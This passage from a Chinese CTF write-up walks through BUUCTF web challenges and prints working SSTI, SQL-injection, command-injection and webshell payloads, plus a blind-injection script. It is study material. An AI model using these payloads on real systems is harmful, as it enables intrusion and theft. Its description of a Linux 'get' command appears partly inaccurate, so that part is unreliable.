$d;//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8B%9A%8C%8B%A2%D6%D6?&gt;\n\n构造payload:\n注意对字符串取反需要用括号包起来\n?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8B%9A%8C%8B%A2%D6%D6)\n\n注意连接的时候需要使用自己的网络，不然校园网蚁剑连不起\n这个题目其实还需要去phpinfo()中查看disable function，但其实就是执行phpinfo()发现命令执行函数被禁止了，所以我们需要用到disable_functions这个插件，打开之后就可以进行绕过了\n\n\n33.[BJDCTF2020]EasySearchSSI注入漏洞\n34.[GYCTF2020]FlaskApp这个题目在SSTI的基础上用到了pin码的计算，也算是学到了\n这个题目我们首先寻找注入点，只有base64加密和解密的地方有输入框，在解密后有回显，自然考虑解密。我们先将&#123;&#123;1+1&#125;&#125;进行加密然后再解码发现变为2，这里有注入还过滤掉了*\n当我们在解码的界面输入无法无法解码的字符串时\n\n\n触发了debug，我们顺便拿到了moddir flask库下app.py的绝对路径\n/usr/local/lib/python3.7/site-packages/flask/app.py\n\n这个题目本来是可以直接SSTI注出来的，但是有过滤那些固定调用os模块的方法，我懒得用脚本去跑了，还要编码，直接试下pin码计算\n额，草率了，就算是pin码计算也需要通过SSTI注入读取文件才行，还是需要跑脚本\n我在读取的时候还发现这个不能用.__subclasses()后面必须要接中括号才行，这应该是为了防止直接找到模块的序号，脚本不知道哪里出问题了，只能先用其他现成的了\n&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;或者这个也行：&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;\n\n拿到用户名为flaskweb\n继续读取uuid\n&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/sys/class/net/eth0/address&#x27;).read()&#125;&#125;#82:e9:f2:0a:a9:ac  我们转为十进制#143941299775916\n\n最后读机器id\n&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/proc/self/cgroup&#x27;).read()&#125;&#125;#a1b73f933f9c79d09d51f9d2f77ab580f444394cec58c428623f7e52b505cc2f\n\n\n\n35.[WUSTCTF2020]颜值成绩查询这个题目一开始就认为是sql注入，我们输入不同数字回显不同的内容，但是使用万能密码或输入错误的数字显示错误的界面\n一时间没地方去下手，看了题解才知道原来是万能密码里面有字符被过滤掉了，我们需要找到过滤的字符\n具体思路就是通过不同的万能密码来比较出被过滤的字符\n这题过滤掉的是空格我们可以用注释符代替空格\n0/**/or/**/1=1\n\n发现仍有回显\n但是这个题目只有两种回显，联合注入和报错注入都不能用，直接上布尔盲注\n这个题目还是比较简单的，脚本使用的也是ascii()和二分法进行注入使用if对比较结果进行判断\nimport requestsurl=&#x27;http://160b459a-3ded-48af-b308-107caf2a2135.node5.buuoj.cn:81/?&#x27;flag=&#x27;&#x27;for i in range(1,50):    low = 32    high = 127    while low&lt;high :        mid = (low + high) // 2        data=&#123;            #select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;            &#x27;stunum&#x27;:f&quot;0/**/or/**/if(ascii(substr((select/**/group_concat(flag,value)from/**/flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;        &#125;        r=requests.get(url,params=data)        #print(r.text)        if &#x27;admin&#x27; in r.text:            low =mid+1        else :            high=mid    if low!=32:        flag+=chr(low)        print(flag)    else :     break\n\n36.[FBCTF2019]RCEService这个题目界面就一个输入框，也不知道干什么，只能去看源码\n&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;  $json = $_REQUEST[&#x27;cmd&#x27;];  if (!is_string($json)) &#123;    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123;    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125; else &#123;    echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;;    $cmd = json_decode($json, true)[&#x27;cmd&#x27;];    if ($cmd !== NULL) &#123;      system($cmd);    &#125; else &#123;      echo &#x27;Invalid input&#x27;;    &#125;    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125;&#125;?&gt;\n\n这个源码无敌了，把能过滤的都过滤掉了，这个正则必须绕过，不然我们不能命令执行\n本来想用正则溢出的但是这个是GET传参，传不了那么多字符，我们只能看漏洞，这个正则匹配没有m，只能匹配一行，我们使用%0a绕过即可\n需要注意putenv(&#39;PATH=/home/rceservice/jail&#39;);意味着我们无法直接去调用cat等命令，因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以此处部分命令我们得使用其存放的绝对路径去调用（不知道这些命令在哪可以用whereis命令在自己VPS上查找)。\n\nPATH 环境变量 决定了系统在哪些目录中查找可执行文件（如 ls、python、gcc 等）。\n执行后：\n当前 PHP 脚本后续调用的 shell_exec()、exec()、system()、passthru() 等函数会使用新的 PATH。\n如果 /home/rceservice/jail 目录不存在或不包含必要的命令（如 /bin/sh），可能导致外部命令执行失败。\n\n\n\n原来我们的命令执行全都是靠系统自带的脚本实现的吗\n所以只能使用绝对路径使用cat命令，cat命令在/bin文件夹下\n这次使用的是^ $的典型行头和行尾的匹配我们直接%0A绕过即可\n//首先查看目录文件?cmd=&#123;%0A&quot;cmd&quot;:&quot;ls /home/rceservice&quot;%0A&#125;//文件内容?cmd=&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;//这里面/bin/cat和平时的cat一样，只不过需要绝对路径diao\n\n\n绕过逻辑：\n**前导 %0A**：破坏 ^&#123; 的匹配，因为正则中的 ^ 默认只匹配行首（换行符后的 &#123; 不被识别为行首）。\n**尾部 %0A**：破坏 &#125;$ 的匹配，因为 $ 默认只匹配行尾（换行符前的 &#125; 不被识别为行尾）。\n\n\n结论：  两个 %0A 都是必需的，否则正则可能部分匹配成功（例如仅尾部换行时，^&#123;&quot;cmd&quot;:... 仍可能被匹配）。\n\n37.[Zer0pts2020]Can you guess it?这个题目又是不会的php特性题，妈的第三版的题目怎么这么难，一个上午没写出一个题目，对着题解都不会\n&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;    exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123;    highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));    exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123;    $guess = (string) $_POST[&#x27;guess&#x27;];    if (hash_equals($secret, $guess)) &#123;        $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;    &#125; else &#123;        $message = &#x27;Wrong.&#x27;;    &#125;&#125;?&gt;\n\n这个题目分为两个部分GET source和POST guess部分，题解说hash_equals我们没办法绕过，虽然我也不知道绕过有什么用\n我们只能从highlight_file下手，先来看下我们不认识的东西\n$SEVER[‘PHP_SELF’]\n$_SERVER[&#39;PHP_SELF&#39;] 是 PHP 预定义的服务器变量之一，它返回当前正在执行的脚本的相对路径。\n比如url/index.php/config.php就会返回index.php/config.php\nbasename()\nbasename() 是 PHP 中一个常用的文件路径处理函数，用于返回路径中的文件名部分\n比如/indedx.php/config.php返回config.php\n这题的两个主要漏洞分别为正则表达式和basename()函数\nif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;    exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125; //这个正则匹配有$匹配行尾，我们只需要/index.php/confing.php/XXX就可以绕过了\n\nhighlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));//basename()会拿到路径最后的文件名 但是假如我们在/index.php/config.php/%ff等不可解析的url编码\n\n\n\n解码出不可识别字符，就会忽略%ff从而basename(/index.php/config.php/)-&gt;config.php\npayload:\nindex.php/config.php/%a1?source=a\n\n\n\n\n\n38.[MRCTF2020]套娃php特性的题目，找到题目都花了点时间\n首先我们查看源码\n&lt;?php$query = $_SERVER[&#x27;QUERY_STRING&#x27;];if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;//即不能存在_，这里用%5f url编码绕过也被过滤了，但是可以使用空格代替_来进行绕过    die(&#x27;Y0u are So cutE!&#x27;);&#125;if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;//%0A是回车的url编码，可以满足不强等于，同时满足含有特定字符串    echo &quot;you are going to the next ~&quot;;&#125;\n\n首先有提示说空格可以绕过参数名下划线的匹配，这让我想到了之前写题目时遇到的参数名问题，不止空格可以点号也可以中括号也可以但是好像[会让后面不替换\n在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：CTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM\n$_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;])//第一个判断应该是从行头进行匹配，第二个正则匹配则需要头尾进行匹配，我们只需要保留头部的情况下破坏尾部匹配即可\n\n第一个payload\n?b.u.p.t=23333%0A\n\n接着叫我们访问 secrettw.php\n访问问了之后发现源码注释里面有一串字符串，听大佬的放到控制台中，拿到\n\n\n我们post传入Merak传入这个字符串成功显示源码\n&lt;?phperror_reporting(0);include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;);include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123;    highlight_file(__FILE__);    die();&#125;function change($v)&#123;    $v = base64_decode($v);    $re = &#x27;&#x27;;    for($i=0;$i&lt;strlen($v);$i++)&#123;        $re .= chr ( ord ($v[$i]) + $i*2 );    &#125;    return $re;&#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)    echo &quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;    echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);    echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt;\n\ngetIp()明明没这个函数但是大佬说需要用ip需要本地访问：Client-Ip:127.0.0.1\n然后file_get_contents()绕过就很简单了，直接用data伪协议\nfunction change($v)&#123;    $v = base64_decode($v);    $re = &#x27;&#x27;;    for($i=0;$i&lt;strlen($v);$i++)&#123;        $re .= chr ( ord ($v[$i]) + $i*2 );    &#125;    return $re;&#125;\n\n这个代码实现了一个简单的编码我们需要写个脚本进行构造payload\n&lt;?phpfunction change($v)&#123;    $re = &#x27;&#x27;;    for($i=0;$i&lt;strlen($v);$i++)&#123;        $re .= chr ( ord ($v[$i]) - $i*2 );    &#125;    $re = base64_encode($re);    return $re;&#125;$v=&#x27;flag.php&#x27;;echo change($v);\n\n我们让ascii码值减然后再编码即可\npayload:\n??2333=data://text/plain,todat+is+a+happy+day&amp;file=ZmpdYSZmXGI=\n\n39.[CSCCTF 2019 Qual]FlaskLight看题目就知道是SSTI的题目，题目告诉我们需要用GET请求传参search\n开始用一些关键词试了一下，发现只用globals被过滤掉了，但是当我想用脚本去把os模块跑出来的时候才发现有问题\n页面回显有点奇怪\n&#123;&#123;().__class__.__base__.__subclasses__()[&#x27; +str(i)+ &#x27;]&#125;&#125;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;Flasklight&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;marquee&gt;&lt;h1&gt;Flasklight&lt;/h1&gt;&lt;/marquee&gt;  &lt;h2&gt;You searched for:&lt;/h2&gt;  &lt;h3&gt;&amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt;&lt;/h3&gt;  &lt;br&gt;  &lt;h2&gt;Here is your result&lt;/h2&gt;  &lt;h3&gt;[]&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;\n\n和之前的各种方法不一样，看了大佬的题解才知道这是python2，因为在python3中subclasses()里面是没有type file的，根据这个回显应该是跑不出来的\n但是SSTI的解法实在太多了，这里说一下我认为最简单的命令执行\n?search=&#123;&#123;lipsum[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;\n\n\n\npayload\n?search=&#123;&#123;lipsum[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat flasklight/coomme_geeeett_youur_flek &#x27;).read()&#125;&#125;\n\n40.[红明谷CTF 2021]write_shell写了这么久终于遇到了一个会写的题目了\n&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;        die(&#x27;hacker!!!&#x27;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key=&gt;$output)&#123;          $input[$key] = waf($output);      &#125;  &#125;else&#123;      $input = check($input);  &#125;&#125;$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#x27;pwd&#x27;:        echo $dir;        break;    case &#x27;upload&#x27;:        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;\n\n这个题目首先用$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;获取到我的ip，但是被md5加密了，我们传入ip没多大作用。\n我们先传入?action=pwd进行查看$dir拿到sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/index.php这个就是我们等下写入文件的路径\n我们拿到文件路径后就开始写shell，看这个过滤，我只能说太水了\nif(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;        die(&#x27;hacker!!!&#x27;);    &#125;else&#123;        return $input;    &#125;//过滤掉了eval，我们可以尝试用assert，但是过滤掉了下划线，所以我们不能用蚁剑//但是命令执行他是一个都没过滤，唯一过滤了单引号还没过滤掉双引号\n\n这里我们不使用引号，我们直接用反引号进行命令执行\n?action=upload&amp;data=&lt;?=`ls%09/`?&gt;//不知道为什么反引号里面不能用%0A，其他函数都可以用    ?action=upload&amp;data=&lt;?=`ls%09/flllllll1112222222lag`?&gt;\n\n41.[RCTF2015]EasySQL看到了sql，终于不会和以前一样在登录框那里注入了，没报错回显也没状态，总之先注册然后登录一下。但是发现一个奇怪的地方注册界面邮箱里面不能有@字符(话说这还是邮箱吗，难怪一直注册不了)\n登进去之后没看到什么可以注入的地方，只有一个更改密码的地方，看来只有这里有注入了，看了题解说这是二次注入，应该是UPDATE语句\n好吧我错了，我应该认真看题解的，这个他妈的竟然是在注册界面，我就说我该密码改半天怎么没回显\n整体思路就是我们在注册界面username先进行注入，然后在改密码的时候会进行select查询username的password，我们利用这个查询语句进行注入\n但是这样不应该觉得好麻烦吗，每次注入都需要注册一个账号\n#我们尝试的闭合符为&quot;#爆库6666&quot;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)##web_sqli#爆表666&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e),1)##article,flag,users#爆列6666&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),0x7e),1)##flag#爆数据6666&quot;||updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1)##RCTF&#123;Good job! But flag not her 报错注入回显有限，但是我们好像被耍了\n\n不行上面写太多了\n#爆users表6666&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)##name,pwd,email,real_flag_1s_her   users表 回显内容长度限制，但是可以猜出列名 real_flag_1s_here#title,content  article表6666&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1)##xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx 妈的服了  应该是在flag前面加了一些没有用的东西 题解说需要用正则表达式6666&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;flag&#x27;)),0x7e),1)##flag&#123;0d3e3f2b-d915-47f9-91ac-4d   flag果然会显示不全6666&quot;||updatexml(1,concat(0x7e,(substr(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;flag&#x27;)),10,10),0x7e),1)##把substr给过滤掉了 只能使用reverse()对查询结果从后面开始输出6666&quot;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;flag&#x27;))),0x7e),1)##&#125;2e4f65e053d4-ca19-9f74-519d-b2  我们只需要从后往前读 4d350e56f4e2&#125;#拼接起来flag&#123;0d3e3f2b-d915-47f9-91ac-4d350e56f4e2&#125;\n\n\n\n42.[CISCN2019 华北赛区 Day1 Web5]CyberPunk没想到这么快又遇到了sql二次注入的题目，看来比赛很喜欢考这种题目\n但是这个题目可以拿到源码，可以好好分析一下\n//index.php&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#x27;file&#x27;]) ? $_GET[&#x27;file&#x27;] : null);if (isset($file))&#123;    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;        echo(&#x27;no way!&#x27;);        exit;    &#125;    @include($file);&#125;?&gt;\n\n//change.php&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $address = addslashes($_POST[&quot;address&quot;]);    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];        $result = $db-&gt;query($sql);?&gt;\n\n//confirm.php&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $address = $_POST[&quot;address&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if($fetch-&gt;num_rows&gt;0) &#123;        $msg = $user_name.&quot;已提交订单&quot;;    &#125;else&#123;        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;        $re = $db-&gt;prepare($sql);        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);?&gt;\n\n//delete.php&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        $result = $db-&gt;query(&#x27;delete from `user` where `user_id`=&#x27; . $row[&quot;user_id&quot;]);?&gt;\n\n&lt;?php//search.phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;?&gt;\n\n由于代码太长了，我把一些不用看的代码给删除了，整体思路就是index.php里面写入数据，然后把数据传入confirm.php进行过滤和预处理，过滤的话只对username和phone进行过滤，但由于是预处理我们这里没办法直接注入\n然后就只能考虑二次注入了，search.php，由于过滤的关键词有点多，我们也没有很好的注入方法，查询语句只用到了username和phone，我们address二次注入在这里没用\ndelete.php也是和search.php一样，sql没有用到address\n只剩下change.php了\nif(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $address = addslashes($_POST[&quot;address&quot;]);    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];\n\n这个代码里面我们可以看到，还是只对username和phone进行过滤，对address只有 addslashes($_POST[&quot;address&quot;]);，然后就执行update语句，我们可以利用updata语句执行的时候进行报错注入\naddslashes() 是 PHP 中一个用于字符串处理的函数，主要功能是在特定的字符前添加反斜线（\\）进行转义。\n该函数会在以下字符前添加反斜线：\n\n单引号（’）\n双引号（”）\n反斜线（\\）\nNULL（NUL 字符）\n\n有转义我们大概率是没办法直接注入的，但是原来的address并没有被转义，我们直接通过原来的address进行报错注入\n我们需要先在index.php写报错语句，然后通过delete.php进行二次注入\nadmin&#x27;or extractvalue(1,concat(0x7e,(database()),0x7e))##爆库 ctfusersadmin&#x27;or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) ##爆表 useradmin&#x27;or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),0x7e)) #爆列 Host,User,Password,Select_priv这里我已经怀疑数据库里面没有flag了 看了wp 果然没有在\n\n但是看到了一个有点厉害的写法\naddress=&#x27;,`address`=(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;FLAG_TABLE&#x27;))#我们把这个和sql语句进行拼接得到update `user` set `address`=&#x27;&#x27;, `old_address`=&#x27;&#x27;,`address`=(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;FLAG_TABLE&#x27;))#这样通过闭合的方式 对address进行再赋值，赋值正好是查询语句的结果，然后我们去search.php界面就能看到查询结果了\n\n最后wp告诉我们flag在flag.txt里面，Mysql里面load_file()可以读取本地文件，我们可以使用报错注入爆出来，但是用新方法吧\naddress=&#x27;,`address`=(select load_file(&quot;/flag.txt&quot;) )#\n\n这个也是二次注入，但原理和报错不一样，这个是利用old_address进行闭合然后让新address赋值查询结果\n报错注入\nadmin&#x27;or extractvalue(1,concat(0x7e,(select load_file(&quot;/flag.txt&quot;)),0x7e))#   #~flag&#123;ae84362f-8ddd-4490-b5ce-1e&#x27;#但是flag还是会显示不全，我们还需要用substr()去读后面的flagadmin&#x27;or extractvalue(1,concat(0x7e,substr((select load_file(&quot;/flag.txt&quot;)),20,40),0x7e))##4490-b5ce-1e20f5c58ba0&#125;#flag&#123;ae84362f-8ddd-4490-b5ce-1e20f5c58ba0&#125;\n\n43.[HITCON 2017]SSRFme  没写完&lt;?php    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);    @mkdir($sandbox);    @chdir($sandbox);    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));    $info = pathinfo($_GET[&quot;filename&quot;]);    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__)\n\n这个首先是获取到了我们本机的ip，然后对其进行了一个MD5加密，我们自己使用php读出路径\n&lt;?phpecho md5(&#x27;orange&#x27;.&#x27;192.168.122.15&#x27;);//sandbox/50d5f583d8a911dde39156ba3f03c3d5\n\n然后就是题目为我们自动创建了目录\n然后就出现这个代码\n    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));//escapeshellarg()对我们输出进行转义，我们不能从这里注入    $info = pathinfo($_GET[&quot;filename&quot;]);    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__)\n\n我们的主要是通过GET命令进行写入\nGET命令\n在Linux系统中，get命令是一个用于从远程服务器上获取文件的基本工具。这个命令支持多种协议，包括HTTP、FTP和SFTP，允许用户通过简单的命令行操作从服务器下载文件并保存到本地目录。\nget命令的基本用法\nget命令的基本语法非常直观，用户只需提供文件的URL和一些可选的参数即可开始下载。例如，使用HTTP协议从远程服务器获取文件的命令如下：\nget http://example.com/file.txt\n\n如果用户想要将下载的文件保存到特定的目录，可以使用*-O*参数来指定文件的保存路径。例如，将文件保存到根目录的命令如下：\nget -O /path/to/save/file.txt ftp://example.com/file.txt\n\n\n\n把命令执行结果放到$data里面，然后执行文件写入命令\n @file_put_contents(basename($info[&quot;basename&quot;]), 